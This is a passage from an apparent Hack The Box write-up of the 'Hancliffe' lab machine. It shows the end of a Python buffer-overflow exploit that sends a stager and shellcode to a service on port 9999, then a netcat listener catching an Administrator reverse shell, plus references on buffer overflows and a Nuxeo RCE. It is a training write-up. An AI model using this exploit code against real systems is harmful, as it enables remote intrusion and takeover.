<span id="cb52-50"><a href="#cb52-50" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x71\xff\xd0\xff\xd3</span><span class="st">'</span>               <span class="co"># call eax | call ebx</span></span>
<span id="cb52-51"><a href="#cb52-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb52-52"><a href="#cb52-52" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">=</span> stager</span>
<span id="cb52-53"><a href="#cb52-53" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> (<span class="dv">66</span> <span class="op">-</span> <span class="bu">len</span>(stager))</span>
<span id="cb52-54"><a href="#cb52-54" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\xa8\x23\x90\x71</span><span class="st">'</span>                   <span class="co"># jmp esp ; within the exe</span></span>
<span id="cb52-55"><a href="#cb52-55" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\xeb\xb9\x90\x90</span><span class="st">'</span>                   <span class="co"># jmp to stager ; start of 66-byte island</span></span>
<span id="cb52-56"><a href="#cb52-56" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> <span class="dv">500</span></span>
<span id="cb52-57"><a href="#cb52-57" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb52-58"><a href="#cb52-58" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb52-59"><a href="#cb52-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb52-60"><a href="#cb52-60" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb52-61"><a href="#cb52-61" aria-hidden="true" tabindex="-1"></a>    s.<span class="ex">connect</span>((ip, port))</span>
<span id="cb52-62"><a href="#cb52-62" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Connected to target: 10.10.11.115:9999"</span>)</span>
<span id="cb52-63"><a href="#cb52-63" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb52-64"><a href="#cb52-64" aria-hidden="true" tabindex="-1"></a>    s.send(user)</span>
<span id="cb52-65"><a href="#cb52-65" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb52-66"><a href="#cb52-66" aria-hidden="true" tabindex="-1"></a>    s.send(passwd)</span>
<span id="cb52-67"><a href="#cb52-67" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb52-68"><a href="#cb52-68" aria-hidden="true" tabindex="-1"></a>    s.send(fullname)</span>
<span id="cb52-69"><a href="#cb52-69" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb52-70"><a href="#cb52-70" aria-hidden="true" tabindex="-1"></a>    s.send(<span class="bu">buffer</span>)</span>
<span id="cb52-71"><a href="#cb52-71" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Sent stager, waiting 5 seconds..."</span>)</span>
<span id="cb52-72"><a href="#cb52-72" aria-hidden="true" tabindex="-1"></a>    time.sleep(<span class="dv">5</span>)</span>
<span id="cb52-73"><a href="#cb52-73" aria-hidden="true" tabindex="-1"></a>    s.send(payload <span class="op">+</span> <span class="st">b'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> (<span class="dv">1024</span> <span class="op">-</span> <span class="bu">len</span>(payload)))</span>
<span id="cb52-74"><a href="#cb52-74" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Sent payload, check for incomming shell!"</span>)</span>
<span id="cb52-75"><a href="#cb52-75" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span>:</span>
<span id="cb52-76"><a href="#cb52-76" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[-] Could not connect."</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Run the script to get Administrator shell!</p>
<div class="sourceCode" id="cb53"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> ./final_bof.py</span>
<span id="cb53-2"><a href="#cb53-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Connected to target: 10.10.11.115:9999</span>
<span id="cb53-3"><a href="#cb53-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Sent stager, waiting 5 seconds...</span>
<span id="cb53-4"><a href="#cb53-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Sent payload, check for incomming shell!</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb54"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> nc <span class="at">-lvnp</span> 4488</span>
<span id="cb54-2"><a href="#cb54-2" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
<span id="cb54-3"><a href="#cb54-3" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.14</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.115]</span> 54473</span>
<span id="cb54-4"><a href="#cb54-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Microsoft</span> Windows [Version 10.0.19043.1266]</span>
<span id="cb54-5"><a href="#cb54-5" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">c</span><span class="kw">)</span> <span class="ex">Microsoft</span> Corporation. All rights reserved.</span>
<span id="cb54-6"><a href="#cb54-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb54-7"><a href="#cb54-7" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\system32</span><span class="op">&gt;</span>whoami</span>
<span id="cb54-8"><a href="#cb54-8" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb54-9"><a href="#cb54-9" aria-hidden="true" tabindex="-1"></a><span class="ex">hancliffe\administrator</span></span>
<span id="cb54-10"><a href="#cb54-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb54-11"><a href="#cb54-11" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\system32</span><span class="op">&gt;</span>type C:<span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\r</span>oot.txt</span>
<span id="cb54-12"><a href="#cb54-12" aria-hidden="true" tabindex="-1"></a><span class="bu">type</span> C:<span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\r</span>oot.txt</span>
<span id="cb54-13"><a href="#cb54-13" aria-hidden="true" tabindex="-1"></a><span class="ex">5018882876cc460554809abe9140eb89</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<p><strong>nginx parser logic:</strong><br> <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" class="uri">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
<p><strong>nuxeo authentication bypass rce:</strong><br> <a href="https://github.com/mpgn/CVE-2018-16341" class="uri">https://github.com/mpgn/CVE-2018-16341</a></p>
<p><strong>firefox decrypt:</strong><br> <a href="https://github.com/unode/firefox_decrypt" class="uri">https://github.com/unode/firefox_decrypt</a></p>
<p><strong>ascii, hex, bin, dec, converter:</strong><br> <a href="https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html" class="uri">https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html</a></p>
<p><strong>buffer overflow:</strong><br> <a href="https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/" class="uri">https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/</a><br> <a href="https://liodeus.github.io/2020/08/11/bufferOverflow.html" class="uri">https://liodeus.github.io/2020/08/11/bufferOverflow.html</a><br> <a href="https://0xrick.github.io/binary-exploitation/bof5/" class="uri">https://0xrick.github.io/binary-exploitation/bof5/</a><br> <a href="https://security.stackexchange.com/questions/236956/buffer-overflow-mona-modules-all-show-rebase-safeseh-aslr-true" class="uri">https://security.stackexchange.com/questions/236956/buffer-overflow-mona-modules-all-show-rebase-safeseh-aslr-true</a><br> <a href="https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03" class="uri">https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03</a><br> <a href="https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow" class="uri">https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow</a><br> <a href="https://snowscan.io/htb-writeup-bighead/#" class="uri">https://snowscan.io/htb-writeup-bighead/#</a><br> <a href="http://mislusnys.github.io/post/htb-bighead/" class="uri">http://mislusnys.github.io/post/htb-bighead/</a><br></p>


</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
window.document.addEventListener("DOMContentLoaded", function (event) {
  const toggleBodyColorMode = (bsSheetEl) => {
    const mode = bsSheetEl.getAttribute("data-mode");
    const bodyEl = window.document.querySelector("body");
    if (mode === "dark") {
      bodyEl.classList.add("quarto-dark");
      bodyEl.classList.remove("quarto-light");
    } else {
      bodyEl.classList.add("quarto-light");
      bodyEl.classList.remove("quarto-dark");
    }
  }
  const toggleBodyColorPrimary = () => {
    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
    if (bsSheetEl) {
      toggleBodyColorMode(bsSheetEl);
    }
  }
  toggleBodyColorPrimary();  
  const icon = "";
  const anchorJS = new window.AnchorJS();
  anchorJS.options = {
    placement: 'right',
    icon: icon
  };
  anchorJS.add('.anchored');
  const isCodeAnnotation = (el) => {
    for (const clz of el.classList) {
      if (clz.startsWith('code-annotation-')) {                     
        return true;
      }
    }
    return false;
  }
  const onCopySuccess = function(e) {
    // button target
    const button = e.trigger;
    // don't keep focus
    button.blur();
    // flash "checked"
    button.classList.add('code-copy-button-checked');
    var currentTitle = button.getAttribute("title");
    button.setAttribute("title", "Copied!");
    let tooltip;
    if (window.bootstrap) {
      button.setAttribute("data-bs-toggle", "tooltip");
      button.setAttribute("data-bs-placement", "left");
      button.setAttribute("data-bs-title", "Copied!");
      tooltip = new bootstrap.Tooltip(button, 
        { trigger: "manual", 
          customClass: "code-copy-button-tooltip",
          offset: [0, -8]});
      tooltip.show();    
    }
    setTimeout(function() {
      if (tooltip) {
        tooltip.hide();
        button.removeAttribute("data-bs-title");
        button.removeAttribute("data-bs-toggle");
        button.removeAttribute("data-bs-placement");
      }
      button.setAttribute("title", currentTitle);
      button.classList.remove('code-copy-button-checked');
    }, 1000);
    // clear code selection
    e.clearSelection();
  }
  const getTextToCopy = function(trigger) {
      const codeEl = trigger.previousElementSibling.cloneNode(true);
      for (const childEl of codeEl.children) {
        if (isCodeAnnotation(childEl)) {
          childEl.remove();
        }
      }
      return codeEl.innerText;
  }
  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
    text: getTextToCopy
  });
  clipboard.on('success', onCopySuccess);
  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
    // For code content inside modals, clipBoardJS needs to be initialized with a container option
    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
      text: getTextToCopy,
      container: window.document.getElementById('quarto-embedded-source-code-modal')
    });
    clipboardModal.on('success', onCopySuccess);
  }
    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
    var mailtoRegex = new RegExp(/^mailto:/);
      var filterRegex = new RegExp("https:\/\/exploit\.se");
    var isInternal = (href) => {
        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
    }
    // Inspect non-navigation links and adorn them if external
 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
    for (var i=0; i<links.length; i++) {
      const link = links[i];
      if (!isInternal(link.href)) {
        // undo the damage that might have been done by quarto-nav.js in the case of
        // links that we want to consider external
        if (link.dataset.originalHref !== undefined) {
          link.href = link.dataset.originalHref;
        }
      }
    }
  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
    const config = {
      allowHTML: true,
      maxWidth: 500,
      delay: 100,
      arrow: false,
      appendTo: function(el) {
          return el.parentElement;
      },
      interactive: true,
      interactiveBorder: 10,
      theme: 'quarto',
      placement: 'bottom-start',
    };
    if (contentFn) {
      config.content = contentFn;
    }
    if (onTriggerFn) {
      config.onTrigger = onTriggerFn;
    }
    if (onUntriggerFn) {
      config.onUntrigger = onUntriggerFn;
    }
    window.tippy(el, config); 
  }
  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
  for (var i=0; i<noterefs.length; i++) {
    const ref = noterefs[i];
    tippyHover(ref, function() {
      // use id or data attribute instead here
      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
      try { href = new URL(href).hash; } catch {}
      const id = href.replace(/^#\/?/, "");
      const note = window.document.getElementById(id);
      if (note) {
        return note.innerHTML;
      } else {
        return "";
      }
    });
  }
  const xrefs = window.document.querySelectorAll('a.quarto-xref');
  const processXRef = (id, note) => {
    // Strip column container classes
    const stripColumnClz = (el) => {
      el.classList.remove("page-full", "page-columns");
      if (el.children) {
        for (const child of el.children) {
          stripColumnClz(child);
        }
      }
    }
    stripColumnClz(note)
    if (id === null || id.startsWith('sec-')) {
      // Special case sections, only their first couple elements
      const container = document.createElement("div");
      if (note.children && note.children.length > 2) {
        container.appendChild(note.children[0].cloneNode(true));
        for (let i = 1; i < note.children.length; i++) {
          const child = note.children[i];
          if (child.tagName === "P" && child.innerText === "") {
            continue;
          } else {
            container.appendChild(child.cloneNode(true));
            break;
          }
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(container);
        }
        return container.innerHTML
      } else {
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        return note.innerHTML;
      }
    } else {
      // Remove any anchor links if they are present
      const anchorLink = note.querySelector('a.anchorjs-link');
      if (anchorLink) {
        anchorLink.remove();
      }
      if (window.Quarto?.typesetMath) {
        window.Quarto.typesetMath(note);
      }
      // TODO in 1.5, we should make sure this works without a callout special case
      if (note.classList.contains("callout")) {
        return note.outerHTML;
      } else {
        return note.innerHTML;
      }
    }
  }
  for (var i=0; i<xrefs.length; i++) {
    const xref = xrefs[i];
    tippyHover(xref, undefined, function(instance) {
      instance.disable();
      let url = xref.getAttribute('href');
      let hash = undefined; 
      if (url.startsWith('#')) {
        hash = url;
      } else {
        try { hash = new URL(url).hash; } catch {}
      }
      if (hash) {
        const id = hash.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note !== null) {
          try {
            const html = processXRef(id, note.cloneNode(true));
            instance.setContent(html);
          } finally {
            instance.enable();
            instance.show();
          }
        } else {
          // See if we can fetch this
          fetch(url.split('#')[0])
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.getElementById(id);
            if (note !== null) {
              const html = processXRef(id, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      } else {
        // See if we can fetch a full url (with no hash to target)
        // This is a special case and we should probably do some content thinning / targeting
        fetch(url)
        .then(res => res.text())
        .then(html => {
          const parser = new DOMParser();
          const htmlDoc = parser.parseFromString(html, "text/html");
          const note = htmlDoc.querySelector('main.content');
          if (note !== null) {
            // This should only happen for chapter cross references
            // (since there is no id in the URL)
            // remove the first header
            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
              note.children[0].remove();
            }
            const html = processXRef(null, note);
            instance.setContent(html);
          } 
        }).finally(() => {
          instance.enable();
          instance.show();
        });
      }
    }, function(instance) {
    });
  }
      let selectedAnnoteEl;
      const selectorForAnnotation = ( cell, annotation) => {
        let cellAttr = 'data-code-cell="' + cell + '"';
        let lineAttr = 'data-code-annotation="' +  annotation + '"';
        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
        return selector;
      }
      const selectCodeLines = (annoteEl) => {
        const doc = window.document;
        const targetCell = annoteEl.getAttribute("data-target-cell");
        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
        const lineIds = lines.map((line) => {
          return targetCell + "-" + line;
        })
        let top = null;
        let height = null;
        let parent = null;
        if (lineIds.length > 0) {
            //compute the position of the single el (top and bottom and make a div)
            const el = window.document.getElementById(lineIds[0]);
            top = el.offsetTop;
            height = el.offsetHeight;
            parent = el.parentElement.parentElement;
          if (lineIds.length > 1) {
            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
            height = bottom - top;
          }
          if (top !== null && height !== null && parent !== null) {
            // cook up a div (if necessary) and position it 
            let div = window.document.getElementById("code-annotation-line-highlight");
            if (div === null) {
              div = window.document.createElement("div");
              div.setAttribute("id", "code-annotation-line-highlight");
              div.style.position = 'absolute';
              parent.appendChild(div);
            }
            div.style.top = top - 2 + "px";
            div.style.height = height + 4 + "px";
            div.style.left = 0;
            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
            if (gutterDiv === null) {
              gutterDiv = window.document.createElement("div");
              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
              gutterDiv.style.position = 'absolute';
              const codeCell = window.document.getElementById(targetCell);
              const gutter = codeCell.querySelector('.code-annotation-gutter');
              gutter.appendChild(gutterDiv);
            }
            gutterDiv.style.top = top - 2 + "px";
            gutterDiv.style.height = height + 4 + "px";
          }
          selectedAnnoteEl = annoteEl;
        }
      };
      const unselectCodeLines = () => {
        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
        elementsIds.forEach((elId) => {
          const div = window.document.getElementById(elId);
          if (div) {
            div.remove();
          }
        });
        selectedAnnoteEl = undefined;
      };
        // Handle positioning of the toggle
    window.addEventListener(
      "resize",
      throttle(() => {
        elRect = undefined;
        if (selectedAnnoteEl) {
          selectCodeLines(selectedAnnoteEl);
        }
      }, 10)
    );
    function throttle(fn, ms) {
    let throttle = false;
    let timer;
      return (...args) => {
        if(!throttle) { // first call gets through
            fn.apply(this, args);
            throttle = true;
        } else { // all the others get throttled
            if(timer) clearTimeout(timer); // cancel #2
            timer = setTimeout(() => {
              fn.apply(this, args);
              timer = throttle = false;
            }, ms);
        }
      };
    }
      // Attach click handler to the DT
      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
      for (const annoteDlNode of annoteDls) {
        annoteDlNode.addEventListener('click', (event) => {
          const clickedEl = event.target;
          if (clickedEl !== selectedAnnoteEl) {
            unselectCodeLines();
            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
            if (activeEl) {
              activeEl.classList.remove('code-annotation-active');
            }
            selectCodeLines(clickedEl);
            clickedEl.classList.add('code-annotation-active');
          } else {
            // Unselect the line
            unselectCodeLines();
            clickedEl.classList.remove('code-annotation-active');
          }
        });
      }
  const findCites = (el) => {
    const parentEl = el.parentElement;
    if (parentEl) {
      const cites = parentEl.dataset.cites;
      if (cites) {
        return {
          el,
          cites: cites.split(' ')
        };
      } else {
        return findCites(el.parentElement)
      }
    } else {
      return undefined;
    }
  };
  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
  for (var i=0; i<bibliorefs.length; i++) {
    const ref = bibliorefs[i];
    const citeInfo = findCites(ref);
    if (citeInfo) {
      tippyHover(citeInfo.el, function() {
        var popup = window.document.createElement('div');
        citeInfo.cites.forEach(function(cite) {
          var citeDiv = window.document.createElement('div');
          citeDiv.classList.add('hanging-indent');
          citeDiv.classList.add('csl-entry');
          var biblioDiv = window.document.getElementById('ref-' + cite);
          if (biblioDiv) {
            citeDiv.innerHTML = biblioDiv.innerHTML;
          }
          popup.appendChild(citeDiv);
        });
        return popup.innerHTML;
      });
    }
  }
});
</script>
</div> <!-- /content -->




</body></html>